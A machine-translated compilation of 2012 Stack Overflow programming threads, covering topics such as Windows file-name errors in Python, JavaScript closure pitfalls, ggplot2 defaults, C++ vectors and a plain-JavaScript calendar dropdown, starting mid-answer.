`Ctrl +r,e`会将您的字段封装在一个属性中，这意味着它将`public`为您的字段自动生成一个带有 getter/setter 的属性`private`。例如：

从你的基类开始：

```
class Students
{
    private string name;
    private Int32 pin;
    private string addres;
    private int phone; 
```

选择名称并单击，`ctrl +r,e`然后键入要用于新属性的名称（我使用了建议的“名称”），然后按 Enter。你应该得到以下输出：

```
class Students
{
    private string name;

    public string Name
    {
        get { return name; }
        set { name = value; }
    }
    private Int32 pin;
    private string addres;
    private int phone; 
```

# python - python中的IOError 22在Windows上无效

> ID：11955222
> 
> 赞同：2
> 
> 时间：2012-08-14T15:01:26.813
> 
> 标签：python, windows, file, ioerror

我正在为 python 中的串行端口创建一个嗅探器，但是当我在 Windows 中创建 CSV 文件时出现问题。我在某些时候拆分了我的程序，以避免 windows 和 linux 之间不兼容的可能性。它在 linux 上完美运行（测试 32 和 64 字节）。

```
def createNewFiles(self):
    # Nons allons vérifier l'existance du dossier Sniffer_Serie_Result et le créer si besoin
    # De même pour le fichier csv
    if (os.name == "nt"): # pour windows
        self.userPath = os.getenv('HOME') or os.getenv('USERPROFILE')
        self.folderPath= os.path.abspath(self.userPath + "\\Sniffer_Serie_Result")
        #exist_ok=True ==> cree le dossier si il n'existe pas
        os.makedirs(self.folderPath,exist_ok=True)
        self.timestampWithSec= self.timestampWithoutMilli() # utilisé dans les noms de fichier
        self.filePathRequest= os.path.abspath(self.folderPath + "\\Request_at_" + self.timestampWithSec + ".csv")
        self.filePathResponse= os.path.abspath(self.folderPath + "\\Response_at_" + self.timestampWithSec + ".csv")
        self.filePathOverall = os.path.abspath(self.folderPath + "\\Overall_result_at_" + self.timestampWithSec + ".csv")
        with open(self.filePathRequest, 'w') as f:
            writer = csv.writer(f)
            writer.writerow(["Kind of message","Timestamp","Message Hexa","Message ASCII"]) 
        with open(self.filePathResponse, 'w') as f:
            writer = csv.writer(f)
            writer.writerow(["Kind of message","Timestamp","Message Hexa","Message ASCII"]) 
```

文件夹 Sniffer_Serie_Result 的创建没有错误所以此代码首先返回以下错误：

IOError：[Errno 22] 无效参数：'C:\Documents and Settings\stagiaire\Sniffer_Serie_Result\Request_at_......（实际日期和时间）.csv'

我尝试了很多字符串，比如原始字符串，但没有任何效果。

注意：我用于测试的 Windows 是 XP，这也需要在 7 上工作

我希望你能帮助我。谢谢你的帮助！

我不能在星期四之前提供更多信息（目前家里没有互联网）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T09:04:00.023

您试图`:`在文件名中使用字符，而该字符在 Windows 中保留用于驱动器名称（例如`c:/`）。

您必须：

1.  修改`timestampWithoutMilli()`以使用另一个时间分隔符（如`-`），
2.  `:`例如，将获得的时间字符串中的所有内容替换为另一个字符（使用`.replace()`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:23:43.053

您可能会在 userPath 中得到未转义的 \。尝试将所有 \ 更改为 /。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-16T06:45:08.557

```
def createNewFiles(self):
        # Nons allons vérifier l'existance du dossier Sniffer_Serie_Result et le créer si besoin
        # De même pour le fichier csv
        if (os.name == "nt"): # pour windows
            self.userPath = os.getenv('HOME') or os.getenv('USERPROFILE')
            self.folderPath= self.userPath + "/Sniffer_Serie_Result"
            #exist_ok=True ==> cree le dossier si il n'existe pas
            os.makedirs(self.folderPath,exist_ok=True)
            self.timestampWithSec= self.timestampWithoutMilli() # utilisé dans les noms de fichier
            self.filePathRequest= self.folderPath + "/Request_at_" + self.timestampWithSec + ".csv"
            self.filePathResponse= self.folderPath + "/Response_at_" + self.timestampWithSec + ".csv"
            self.filePathOverall = self.folderPath + "/Overall_result_at_" + self.timestampWithSec + ".csv"
            with open(self.filePathRequest, 'w') as f:
                writer = csv.writer(f)
                writer.writerow(["Kind of message","Timestamp","Message Hexa","Message ASCII"]) 
            with open(self.filePathResponse, 'w') as f:
                writer = csv.writer(f)
                writer.writerow(["Kind of message","Timestamp","Message Hexa","Message ASCII"]) 
```

使用此代码，问题完全相同，创建的是文件夹而不是文件。有同样的错误。

# javascript - 如何使用 setInterval 多次调用我的函数？

> ID：11955223
> 
> 赞同：0
> 
> 时间：2012-08-14T15:01:29.180
> 
> 标签：javascript, ajax

我试图做一个 for 循环 10 次，我写了 setInterval 来再次调用我的函数，但它不起作用。我的 for 循环只有十个。那我该怎么办？

```
function randomThumbNews() {
        for(var i=0;i<10;i++){
        $.ajax({
            type: "get", url: "Home/Oku", data: {},
            success: function (data) {
                $("#thumbNews_" + i).html(data);
            }
        });
         }
    }
setInterval(randomThumbNews, 3000); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:18:19.107

问题是——当

```
function (data) {
     $("#thumbNews_" + i).html(data);
 } 
```

被称为循环已经结束，因此`i`将始终为 10。

您只会看到发布到您`<div>`的其中一个的结果

这将解决它，因为函数参数没有闭包：

```
function ajaxAndSet(counter)
{
  $.ajax({
           type: "get", 
           url: "Home/Oku",
           data: {},
           success: function (data) 
           {
              $("#thumbNews_" + counter).html(data);
           }
        });
)

function randomThumbNews() 
{
   for(var i=0;i<10;i++)
   {
       ajaxAndSet(i);
   }
}

setInterval(randomThumbNews, 3000); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:21:05.033

尝试类似：

```
$.ajax({
    type: "get", url: "Home/Oku", data: {},
    context: i, /* NEW - this value comes to your success callback as 'this' */
    success: function (data) {
        $("#thumbNews_" + this).html(data);
    }
}); 
```

# java - Web 模块没有找到另一个模块的类

> ID：11955224
> 
> 赞同：0
> 
> 时间：2012-08-14T15:01:34.987
> 
> 标签：java, jsf, jakarta-ee, maven, websphere

我使用 maven 作为我的项目结构。我的项目中有一个 web 模块，它依赖于我定义的另一个模块：

```
<dependency>
   <groupId>com.stack.project</groupId>
   <artifactId>Modul_Basic</artifactId>
   <version>0.0.1-SNAPSHOT</version>
</dependency> 
```

如果我运行 Maven 安装。它在目标中创建一个war文件，这个war文件在lib目录中包含Modul_Basic jar。问题是：如果我部署在 Myeclipse 中的服务器（Websphere）上。它不打包依赖模块。

我应该如何部署/构建我的 Web 模块？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T10:26:35.760

您的依赖项是否打包为战争？可能你可以尝试[覆盖](http://maven.apache.org/plugins/maven-war-plugin/examples/war-overlay.html)来解决这个问题

# image - 将 *.odt 文件上传到 Google 文档：图片无法加载

> ID：11955227
> 
> 赞同：1
> 
> 时间：2012-08-14T15:01:42.040
> 
> 标签：image, upload, google-docs, openoffice.org

我刚刚尝试将 *.odt 文件上传到我的 Google 文档。到目前为止，一切正常，除了图像没有加载。有没有人让这个工作？还是它缺少的功能？

我在 OSX Lion 上，使用最新版本的 Google Chrome 和 NeoOffice（OpenOffice.org 的 OSX 版本）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:04:16.787

您是否将图片作为链接/参考包含在内？（在对话框中插入图片）

您可以检查图像 src 属性值。解压 odt 文件，然后打开/编辑 content.xml 并搜索图像标签。如果包含图片（无链接/参考），您应该在图片文件夹中找到它，在 content.xml 旁边

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T07:23:56.140

似乎这是一个暂时的问题，它现在正在工作。

# r - 如何更改ggplot2中的默认字体大小

> ID：11955229
> 
> 赞同：110
> 
> 时间：2012-08-14T15:01:56.547
> 
> 标签：r, ggplot2, default, font-size

我想知道是否可以`ggplot2`为整个 R 会话更改图形的一些默认参数，例如字体大小。这个想法是避免为每个情节设置它们。

* * *

## 回答 #1

> 赞同：127
> 
> 时间：2012-08-14T15:11:41.177

采用`theme_set()`

```
theme_set(theme_gray(base_size = 18))
qplot(1:10, 1:10) 
```

![在此处输入图像描述](../Images/a9f840a4f140e91c3ec9753e3d5fcc87.png)

* * *

## 回答 #2

> 赞同：58
> 
> 时间：2012-08-14T15:18:43.683

`theme_set`如果您想在活动会话的剩余部分进行更新，请使用：

```
theme_set(theme_grey(base_size = 18)) 
```

如果您只想更改一个图表，您可以`base_size`在主题中设置：

```
qplot(1:10, 1:10) + theme_grey(base_size = 18) 
ggplot(mtcars, aes(x = mpg, y = cyl)) + 
geom_point() +
theme_grey(base_size = 18) 
```

# javascript - 不确定组合运算符在函数中的作用

> ID：11955232
> 
> 赞同：0
> 
> 时间：2012-08-14T15:02:17.317
> 
> 标签：javascript

我一直在编写以下函数，并且理解了这一行之前的所有内容。

```
 cost += nightSurcharge; 
```

我在我的`if`语句中使用了条件句，用于在晚上 8 点到早上 6 点之间将 nightSurcharge 添加到成本中。

我需要了解的是`+=`，如果满足条件，是否只是说将 nightSurcharge 添加到成本中？

```
// add a parameter called hourOfDay to the function
    var taxiFare = function (milesTraveled, hourOfDay) {
      var baseFare = 2.50;
      var costPerMile = 2.00;
      var nightSurcharge = 0.50; // 8pm to 6am, every night

      var cost = baseFare + (costPerMile * milesTraveled);

      // add the nightSurcharge to the cost starting at 
      // 8pm (20) or if it is before 6am (6)
       if (hourOfDay >= 20 || hourOfDay < 6) {
          cost += nightSurcharge;
      } 

      return cost;

    }; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:03:51.460

> 我需要了解的是`+=`，如果满足条件，是否只是说将 nightSurcharge 添加到成本中？

是的，[这完全正确。](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/Assignment_Operators#Summary)这段代码是等价的：

```
if (hourOfDay >= 20) {
    cost = cost + nightSurcharge;
}
else if (hourOfDay < 6) {
    cost = cost + nightSurcharge;
} 
```

# r - R2OpenBUGS：从中间结果建模最终治疗结果

> ID：11955235
> 
> 赞同：3
> 
> 时间：2012-08-14T15:02:16.713
> 
> 标签：r, r2winbugs

有人在使用 R2OpenBUGS 吗？我应该使用 r2winbugs 吗？...

我正在尝试为具有（单个）中间（3 个月）结果的患者样本模拟最终（2 年）治疗结果（例如成功、死亡、违约或失败）。

R2OpenBUGS 在多项式节点上给了我一个奇怪的后验，其中两个结果是恒定的，另外两个结果是相等的，并且结果的总数大于队列大小。

我究竟做错了什么？提前谢谢了！代码输出如下。

```
 library(R2OpenBUGS)

    model <- function() { 
      # Prior : distribution of final outcomes for treatment cohort N_tx
      outc[1:4] ~ dmulti(p.outc[],N_tx)
      p.outc[1] <- 164/1369
      p.outc[2] <- 907/1369
      p.outc[3] <- 190/1369
      p.outc[4] <- 108/1369
      # Prior : distribution of intermediate outcome (proxy of final outcome) for each final outcome cohort 
      # (e.g. proportion of patient with final outcome 1 that exhibited the intermediate outcome)
      cr_1 ~ dunif(0.451, 0.609)
      cr_2 ~ dunif(0.730, 0.787)
      cr_3 ~ dunif(0.559, 0.700)
      cr_4 ~ dunif(0.148, 0.312)
      # Probability p of the intermediate outcome given prior distributions
      p <- (outc[1]*cr_1+outc[2]*cr_2+outc[3]*cr_3+outc[4]*cr_4)/N_tx
      # Likelihood function for the number of culture conversions at 3 months among those still on treatment in month 6 (excludes confirmed deaths and defaulters)
      cs ~ dbin(p,N_tx)
    } 

    # N_tx is the number of patients in our cohort 
    N_tx <- 100
    # cs is the number of patient exhibiting the intermediate outcome
    cs <- 80

    data <- list("N_tx", "cs")

    inits <- function() { list(outc=c(round(164/1369*N_tx),
                                      round(907/1369*N_tx),
                                      round(190/1369*N_tx),
                                      round(108/1369*N_tx)),
                               cr_1=87/(87+77), 
                               cr_2=689/(689+218), 
                               cr_3=120/(120+70), 
                               cr_4=24/(24+84))
    }

    params <- c("outc") 

    model.file <- file.path(tempdir(), "model.txt") 
    write.model(model, model.file)

    out <- bugs(data, inits, params, model.file, n.iter=100000,debug=TRUE)

    all(out$summary[,"Rhat"] < 1.1) 

    out$mean["outc"] 
    out$sd["outc"] 

    print(out, digits=5) 
```

以下是一些输出：

```
> all(out$summary[,"Rhat"] < 1.1) 
[1] TRUE
> 
> out$mean["outc"] 
$outc
[1] 15.53095 66.00000 14.00000 15.53095

> out$sd["outc"] 
$outc
[1] 3.137715 0.000000 0.000000 3.137715

> 
> print(out, digits=5)
Inference for Bugs model at "C:\", 
Current: 3 chains, each with 1e+05 iterations (first 50000 discarded)
Cumulative: n.sims = 150000 iterations saved
             mean      sd     2.5%    25%    50%    75% 97.5%    Rhat  n.eff
outc[1]  15.53095 3.13771 10.00000 13.000 15.000 18.000 22.00 1.00100 130000
outc[2]  66.00000 0.00000 66.00000 66.000 66.000 66.000 66.00 1.00000      1
outc[3]  14.00000 0.00000 14.00000 14.000 14.000 14.000 14.00 1.00000      1
outc[4]  15.53095 3.13771 10.00000 13.000 15.000 18.000 22.00 1.00100 130000
deviance  8.59096 2.23382  5.08097  6.927  8.323  9.963 13.66 1.00102  55000

For each parameter, n.eff is a crude measure of effective sample size,
and Rhat is the potential scale reduction factor (at convergence, Rhat=1).

DIC info (using the rule, pD = var(deviance)/2)
pD = 2.5 and DIC = 11.1
DIC is an estimate of expected predictive error (lower deviance is better). 
```

# c++ - 如何使用动态内存分配将值传递给对象构造函数的声明

> ID：11955236
> 
> 赞同：1
> 
> 时间：2012-08-14T15:02:23.133
> 
> 标签：c++, object, pointers, dynamic, constructor-overloading

代码如下：

### ****编码 ：****

```
`#include <iostream>

using namespace std;

class pub
{
    string name;

    public:
    pub(string name):name(name){}    //Constructor
    void getName(string name){this->name = name;}
    string returnName(void){return name;}
};

int main(void)
{
    pub * p = new pub[5]; //Error-prone statement.

                          //Ignore for not having "delete" statement

    return 0;
}` 
```

 **### ****问题：****

**1.）在这种情况下，我有什么方法可以将值传递给我分配的每个动态内存，还是我必须为构造函数的参数设置一个默认值才能规避这个问题？**

 **谢谢 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:08:51.890

如果您的编译器支持 C++11，您可以使用[`std::vector`](http://en.cppreference.com/w/cpp/container/vector)并带有初始化列表：

```
std::vector<pub> v { pub("1"), pub("2") }; 
```

请参阅在线演示[https://ideone.com/Qp4uo](https://ideone.com/Qp4uo)。

或者[`std::array`](http://en.cppreference.com/w/cpp/container/array)：

```
std::array<pub, 2> v = { { pub("1"), pub("2") } }; 
```

请参阅在线演示[https://ideone.com/lBXUS](https://ideone.com/lBXUS)。

`delete[]`其中任何一个也消除了动态分配数组的负担。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:10:55.523

除了您使用的有点不合常规的命名约定（我更改`getName()`为`setName()`and `returnName()`，`getName()`并使用尾随`_`表示私有数据成员）之外，使用 `std::vector 将自动为您进行内存管理：

```
#include <algorithm>
#include <iostream>
#include <string>
#include <vector>

using namespace std;

class pub
{
public:
    pub(): name_("default") {}
    pub(string const& name): name_(name){}    //Constructor
    pub(const char* name): name_(name) {}
    void setName(string const& name){ name_ = name;}
    string getName(void) const {return name_;}

private:
    string name_;
};

int main(void)
{
    // initialize with 2 elements, then add 3 more default elements
    std::vector<pub> pub_vec { "bla", "bar" };
    pub_vec.resize(5);

    std::for_each(pub_vec.begin(), pub_vec.end(), [](pub const& elem){
        std::cout << elem.getName() << "\n";
    });

    return 0;
}   // 5 destructors automatically called 
```

注意：添加一个重载的构造函数`const char*`允许你使用字符串文字来初始化你的数据。

在[Ideone上输出](http://ideone.com/n6DJT)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:06:24.603

使用`std::vector<pub>`. 它不需要默认构造函数。

例如

```
std::vector<pub> vec(5, pub("xyz")); 
```

创建一个具有 5 个相等元素的向量。****

# javascript - JavaScript 中的概要

> ID：11955237
> 
> 赞同：1
> 
> 时间：2012-08-14T15:02:25.903
> 
> 标签：javascript, jslint

通过使用 PHPStorm 的检查代码工具，我收到以下消息：

```
'recipient_user.id === app.currentUser.id ? true : false' 
 can be simplified to 
'!!(recipient_user.id === app.currentUser.id)' 
```

我的问题是：由于 jslint 抱怨使用`!!`，是否建议根据 PHPStorm 更改代码？或者它可以以更好的方式重写？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:04:01.057

我会将其更改为：

```
recipient_user.id === app.currentUser.id 
```

因为这保证返回一个真正的布尔值（真或假）。无需`===`使用 . 强制运算符的返回值`!!`。

# linux - bash 转换 w/ 复制文件名

> ID：11955238
> 
> 赞同：0
> 
> 时间：2012-08-14T15:02:26.320
> 
> 标签：linux, bash, filenames

我使用linux，bash。
我在几个目录中有一堆图像文件。所有都有必须保存的特定名称（文件名和目录）。但我需要将所有图像转换为不同的大小和 ppi。我使用了，
`convert -units PixelsPerInch 75 -resize 200x200 ~/filepath/*.jpg ~/filepath.*jpg`
但它替换了错误的文件。此外，我尝试
`"{}" "{}"%03d.jpg`
在新文件名中添加一个数字，但它只提供 001.jpg 等。像
[Bash 这样的解决方案 - 在文件路径参数中获取最后一个目录名/文件名](https://stackoverflow.com/questions/3294072/bash-get-last-dirname-filename-in-a-file-path-argument)
或在 Bash 中
[提取文件名和扩展名以及](https://stackoverflow.com/questions/965053/extract-filename-and-extension-in-bash)脚本的其他部分 或[http://bytebar.blogspot.com/2008/08/bash-filename-extraction.html](http://bytebar.blogspot.com/2008/08/bash-filename-extraction.html) 不起作用或者我没有这样的知识来理解代码......我如何转换那些保留其名称和目录的文件？
`${filename%.}`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:19:44.740

```
ls ~/filepath.*jpg | xargs -n 1 -I{} convert -units PixelsPerInch 75 -resize 200x200 {} {} 
```

“xargs -n 1”使用提供的参数一次调用以下函数。xargs 的 -I{} 参数告诉 xargs 将每次出现的 {} 替换为给定的参数。

# javascript - 自动点击/强制触发js功能

> ID：11955247
> 
> 赞同：1
> 
> 时间：2012-08-14T15:03:03.327
> 
> 标签：javascript, jquery, asp.net, ajax, asp.net-mvc-3

我在我的 MVC 视图中有..

```
 //Submit file
 <% using (Html.BeginForm("MethodName","ControllerName", FormMethod.Post, new { enctype = "multipart/form-data"})) { %>         
     <input type="file" name="file" id="file"/>
     <input type="text" id="file-name" name="Id"/>
     <input type="submit" value="Submit" name="Submit"/>
 <% } %>     

//Save link.
 <span class="Update" onclick="js.function()">Update</span> 
```

单击提交按钮后，我将转到控制器和方法来运行一些将文件提交到数据库的代码。完成后，我需要自动单击/强制单击保存链接，以便在提交后运行js函数..我该怎么做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T17:03:23.587

我会使用 Ajax.BeginForm 并在 OnSuccess 处理程序中单击该按钮。您的代码看起来像这样（未经测试，但应该引导您朝着正确的方向前进）：

```
<% using (Ajax.BeginForm("MethodName","ControllerName",
    new AjaxOptions { 
        OnSuccess ="OnSuccess",
        OnFailure ="OnFailure" 
    },  
    new { 
        enctype = "multipart/form-data"
    })) { %>         
     <input type="file" name="file" id="file"/>
     <input type="text" id="file-name" name="Id"/>
     <input type="submit" value="Submit" name="Submit"/>
 <% } %> 
```

**Javascript**：

```
function OnSuccess() {
    $('.Update').trigger('click');
} 
```

**编辑**：如果您不尝试上传文件，我上面的答案就是您想要的。但是，当我注意到您正在尝试发布文件时，我对此进行了更多调查；并且您不能使用 ajax 上传文件而不使用 html 5、iframe hacks 等。在我看来，您最好的选择是使用上传器，例如[uploadify](http://www.uploadify.com/)或[plupload](http://www.plupload.com/)，根据您的方式使用 html5、flash 或 hacks 解决此问题设置它们。

此外，[binding-httppostedfilebase-using-ajax-beginform](https://stackoverflow.com/questions/2491230/binding-httppostedfilebase-using-ajax-beginform)是一个类似的问题，可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:06:20.447

您可以通过多种方式做到这一点。您可以使用提交按钮作为触发器，防止默认情况发生，这将是标准的发布方法。然后调用 jquery post/get/ajax 方法。在该 post/get/ajax 连续运行后，您可以执行任何其他操作。

如果您有其他想法，则可以使用 jquery 单击按钮，即： `$('button').trigger('click');`

不幸的是，您的描述有点开放，因此很难给出具体答案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:10:50.783

为了自动`trigger`点击（或任何其他类似的事件，就此而言），您需要首先像这样建立事件：

```
// setting up the event (in case they actually click it)
$('.Update').on('click', function () {
       test();
});

// this will automatically call it
$('.Update').trigger('click');

// whatever your function is doing
function test () {
    alert('here');
} 
```

[**jsFiddle DEMO**](http://jsfiddle.net/zj9Gw/1/) ​</p>

# javascript - Javascript 日历下拉

> ID：11955257
> 
> 赞同：0
> 
> 时间：2012-08-14T15:03:38.023
> 
> 标签：javascript

我正在尝试创建一个虚拟 javascript 日历下拉菜单。我希望在选择一个月时显示正确的天数，但无论何时我选择某些内容，都不会显示任何天数。请帮忙。我不能再次使用 jquery，否则这次他们会解雇我。

```
<html>
<head>
<script type="text/javascript">
function show(x) {
var mon = document.getElementById(x).innerHTML;
//if month value is nothing display no days
if (mon == "") {
    document.getElementById("one").style.display="none";
    document.getElementById("two").style.display="none";
    document.getElementById("three").style.display="none";
    document.getElementById("four").style.display="none";
    document.getElementById("five").style.display="none";
    document.getElementById("six").style.display="none";
    document.getElementById("seven").style.display="none";
    document.getElementById("eight").style.display="none";
    document.getElementById("nine").style.display="none";
    document.getElementById("ten").style.display="none";
    document.getElementById("eleven").style.display="none";
    document.getElementById("twelve").style.display="none";
    document.getElementById("thirteen").style.display="none";
    document.getElementById("fourteen").style.display="none";
    document.getElementById("fifteen").style.display="none";
    document.getElementById("sixteen").style.display="none";
    document.getElementById("seventeen").style.display="none";
    document.getElementById("eighteen").style.display="none";
    document.getElementById("nineteen").style.display="none";
    document.getElementById("twenty").style.display="none";
    document.getElementById("twentyone").style.display="none";
    document.getElementById("twentytwo").style.display="none";
    document.getElementById("twentythree").style.display="none";
    document.getElementById("twentyfour").style.display="none";
    document.getElementById("twentyfive").style.display="none";
    document.getElementById("twentysix").style.display="none";
    document.getElementById("twentyseven").style.display="none";
    document.getElementById("twentyeight").style.display="none";
    document.getElementById("twentynine").style.display="none";
    document.getElementById("thirty").style.display="none";
    document.getElementById("thirtyone").style.display="none";
//if month value has 31 days then display all 31 days
} else if ((mon == "January") || (mon == "March") || (mon == "May") || (mon == "July") || (mon == "August") || (mon == "October") || (mon == "December")) {
    document.getElementById("one").style.display="";
    document.getElementById("two").style.display="";
    document.getElementById("three").style.display="";
    document.getElementById("four").style.display="";
    document.getElementById("five").style.display="";
    document.getElementById("six").style.display="";
    document.getElementById("seven").style.display="";
    document.getElementById("eight").style.display="";
    document.getElementById("nine").style.display="";
    document.getElementById("ten").style.display="";
    document.getElementById("eleven").style.display="";
    document.getElementById("twelve").style.display="";
    document.getElementById("thirteen").style.display="";
    document.getElementById("fourteen").style.display="";
    document.getElementById("fifteen").style.display="";
    document.getElementById("sixteen").style.display="";
    document.getElementById("seventeen").style.display="";
    document.getElementById("eighteen").style.display="";
    document.getElementById("nineteen").style.display="";
    document.getElementById("twenty").style.display="";
    document.getElementById("twentyone").style.display="";
    document.getElementById("twentytwo").style.display="";
    document.getElementById("twentythree").style.display="";
    document.getElementById("twentyfour").style.display="";
    document.getElementById("twentyfive").style.display="";
    document.getElementById("twentysix").style.display="";
    document.getElementById("twentyseven").style.display="";
    document.getElementById("twentyeight").style.display="";
    document.getElementById("twentynine").style.display="";
    document.getElementById("thirty").style.display="";
    document.getElementById("thirtyone").style.display="";
//if month value has 30 days then display 30 days
} else if ((mon == "April") || (mon == "June") || (mon == "September") || (mon == "November")) {
    document.getElementById("one").style.display="";
    document.getElementById("two").style.display="";
    document.getElementById("three").style.display="";
    document.getElementById("four").style.display="";
    document.getElementById("five").style.display="";
    document.getElementById("six").style.display="";
    document.getElementById("seven").style.display="";
    document.getElementById("eight").style.display="";
    document.getElementById("nine").style.display="";
    document.getElementById("ten").style.display="";
    document.getElementById("eleven").style.display="";
    document.getElementById("twelve").style.display="";
    document.getElementById("thirteen").style.display="";
    document.getElementById("fourteen").style.display="";
    document.getElementById("fifteen").style.display="";
    document.getElementById("sixteen").style.display="";
    document.getElementById("seventeen").style.display="";
    document.getElementById("eighteen").style.display="";
    document.getElementById("nineteen").style.display="";
    document.getElementById("twenty").style.display="";
    document.getElementById("twentyone").style.display="";
    document.getElementById("twentytwo").style.display="";
    document.getElementById("twentythree").style.display="";
    document.getElementById("twentyfour").style.display="";
    document.getElementById("twentyfive").style.display="";
    document.getElementById("twentysix").style.display="";
    document.getElementById("twentyseven").style.display="";
    document.getElementById("twentyeight").style.display="";
    document.getElementById("twentynine").style.display="";
    document.getElementById("thirty").style.display="";
    document.getElementById("thirtyone").style.display="none";

//case if month value is Feb
} else {
    document.getElementById("one").style.display="";
    document.getElementById("two").style.display="";
    document.getElementById("three").style.display="";
    document.getElementById("four").style.display="";
    document.getElementById("five").style.display="";
    document.getElementById("six").style.display="";
    document.getElementById("seven").style.display="";
    document.getElementById("eight").style.display="";
    document.getElementById("nine").style.display="";
    document.getElementById("ten").style.display="";
    document.getElementById("eleven").style.display="";
    document.getElementById("twelve").style.display="";
    document.getElementById("thirteen").style.display="";
    document.getElementById("fourteen").style.display="";
    document.getElementById("fifteen").style.display="";
    document.getElementById("sixteen").style.display="";
    document.getElementById("seventeen").style.display="";
    document.getElementById("eighteen").style.display="";
    document.getElementById("nineteen").style.display="";
    document.getElementById("twenty").style.display="";
    document.getElementById("twentyone").style.display="";
    document.getElementById("twentytwo").style.display="";
    document.getElementById("twentythree").style.display="";
    document.getElementById("twentyfour").style.display="";
    document.getElementById("twentyfive").style.display="";
    document.getElementById("twentysix").style.display="";
    document.getElementById("twentyseven").style.display="";
    document.getElementById("twentyeight").style.display="";
    document.getElementById("twentynine").style.display="none";
    document.getElementById("thirty").style.display="none";
    document.getElementById("thirtyone").style.display="none";
    //check to see if it was a leap year
    if (/*check if year is divisible by four and has a remainder of zero)*/ {
        //document.getElementById("twentynine").style.display="";
    } else {
    }
}
}
</script>

</head>

<body>
Calendar<br>
<hr align="left" width="200px"/>

--Year ------ Month ----- Day<br>

<select name="year">
<option value="defaulty"></option>
<option value="2012">2012</option>
<option value="2013">2013</option>
<option value="2014">2014</option>
<option value="2015">2015</option>
</select>

<select name="month" onchange="show(this.value)">
<option id="defaultm" value="defaultm"></option>
<option id="January" value="January">January</option>
<option id="February" value="February">February</option>
<option id="March" value="March">March</option>
<option id="April" value="April">April</option>
<option id="May" value="May">May</option>
<option id="June" value="June">June</option>
<option id="July" value="July">July</option>
<option id="August" value="August">August</option>
<option id="September" value="September">September</option>
<option id="October" value="October">October</option>
<option id="November" value="November">November</option>
<option id="December" value="December">December</option>
</select>

<select name="day">
<option id="defaultd" value="defaultd"></option>
<option id="one" value="one" style="display:none">1</option>
<option id="two" value="two" style="display:none">2</option>
<option id="three" value="three" style="display:none">3</option>
<option id="four" value="four" style="display:none">4</option>
<option id="five" value="five" style="display:none">5</option>
<option id="six" value="six" style="display:none">6</option>
<option id="seven" value="seven" style="display:none">7</option>
<option id="eight" value="eight" style="display:none">8</option>
<option id="nine" value="nine" style="display:none">9</option>
<option id="ten" value="ten" style="display:none">10</option>
<option id="eleven" value="eleven" style="display:none">11</option>
<option id="twelve" value="twelve" style="display:none">12</option>
<option id="thirteen" value="thirteen" style="display:none">13</option>
<option id="fourteen" value="fourteen" style="display:none">14</option>
<option id="fifteen" value="fifteen" style="display:none">15</option>
<option id="sixteen" value="sixteen" style="display:none">16</option>
<option id="seventeen" value="seventeen" style="display:none">17</option>
<option id="eighteen" value="eighteen" style="display:none">18</option>
<option id="nineteen" value="nineteen" style="display:none">19</option>
<option id="twenty" value="twenty" style="display:none">20</option>
<option id="twentyone" value="twentyone" style="display:none">21</option>
<option id="twentytwo" value="twentytwo" style="display:none">22</option>
<option id="twentythree" value="twentythree" style="display:none">23</option>
<option id="twentyfour" value="twentyfour" style="display:none">24</option>
<option id="twentyfive" value="twentyfive" style="display:none">25</option>
<option id="twentysix" value="twentysix" style="display:none">26</option>
<option id="twentyseven" value="twentyseven" style="display:none">27</option>
<option id="twentyeight" value="twentyeight" style="display:none">28</option>
<option id="twentynine" value="twentynine" style="display:none">29</option>
<option id="thirty" value="thirty" style="display:none">30</option>
<option id="thirtyone" value="thirtyone" style="display:none">31</option>

</select>

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-14T15:53:46.000

Well to add some actual content to this comment discussion: Here is your jQuery free PURE JS solution.

I chose to do it this way because 1) I hate writing HTML, and 2) to show you the power of learning Javascript properly.

There are some browser compatibility issues with my code (namely older IE versions) I will let you figure these out and handle them on your own.

html:

```
<div id="calendar-container"></div> 
```

js:

```
(function() {
    var calendar = [
        ["January", 31],
        ["February", 28],
        ["March", 31],
        ["April", 30],
        ["May", 31],
        ["June", 30],
        ["July", 31],
        ["August", 31],
        ["September", 30],
        ["October", 31],
        ["November", 30],
        ["December", 31]
        ],
        cont = document.getElementById('calendar-container');

    var sel_year = document.createElement('select'),
        sel_month = document.createElement('select'),
        sel_day = document.createElement('select');

    function createOption(txt, val) {
        var option = document.createElement('option');
        option.value = val;
        option.appendChild(document.createTextNode(txt));
        return option;
    }

    function clearChildren(ele) {
        while (ele.hasChildNodes()) {
            ele.removeChild(ele.lastChild);
        }
    }

    function recalculateDays() {
        var month_index = sel_month.value,
            df = document.createDocumentFragment();
        for (var i = 0, l = calendar[month_index][1]; i < l; i++) {
            df.appendChild(createOption(i + 1, i));
        }
        clearChildren(sel_day);
        sel_day.appendChild(df);
    }

    function generateMonths() {
        var df = document.createDocumentFragment();
        calendar.forEach(function(info, i) {
            df.appendChild(createOption(info[0], i));
        });
        clearChildren(sel_month);
        sel_month.appendChild(df);
    }

    sel_month.onchange = recalculateDays;

    generateMonths();
    recalculateDays();

    cont.appendChild(sel_year);
    cont.appendChild(sel_month);
    cont.appendChild(sel_day);
}());​ 
```

And here is your [jsFiddle Demo](http://jsfiddle.net/rlemon/j2kzv/)

